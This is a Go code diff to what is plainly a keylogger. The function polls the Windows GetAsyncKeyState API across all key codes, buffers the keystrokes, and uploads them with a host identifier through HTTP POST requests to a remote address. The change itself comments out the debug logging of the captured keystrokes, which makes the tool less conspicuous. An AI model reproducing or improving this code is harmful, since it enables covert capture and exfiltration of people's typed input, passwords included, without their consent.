@@ -33,7 +33,7 @@ func KeyBoardCollection(addr string) {
 	elapsedsec := int64(elapsed/time.Millisecond) / 1000
 	for {
 		time.Sleep(60 * time.Millisecond)
-		log.Println(tmpKeylog)
+		//log.Println(tmpKeylog)
 		elapsed := time.Since(start)
 		elapsedsec = int64(elapsed/time.Millisecond) / 1000
 		// 1mins 60s   hitting 180 times keyboard
@@ -47,7 +47,7 @@ func KeyBoardCollection(addr string) {
 				Record: tmpKeylog,
 				Hostid: lib.HOSTID,
 			}
-			log.Println("upload msg", &msgstb)
+			//log.Println("upload msg", &msgstb)
 			resp, _, err := gorequest.New().
 				Post(addr).
 				Set("content-type", "application/x-www-form-urlencoded").
@@ -67,7 +67,7 @@ func KeyBoardCollection(addr string) {
 				Record: tmpKeylog,
 				Hostid: lib.HOSTID,
 			}
-			log.Println("upload msg", &msgstb)
+			//log.Println("upload msg", &msgstb)
 			resp, _, err := gorequest.New().
 				Post(addr).
 				Set("content-type", "application/x-www-form-urlencoded").
@@ -84,7 +84,7 @@ func KeyBoardCollection(addr string) {
 			tmpKeylog = ""
 			continue
 		}
-		log.Println(tmpKeylog, "-----")
+		//log.Println(tmpKeylog, "-----")
 		for KEY := 0; KEY <= 256; KEY++ {
 			Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
 			if Val&0x1 == 0 {
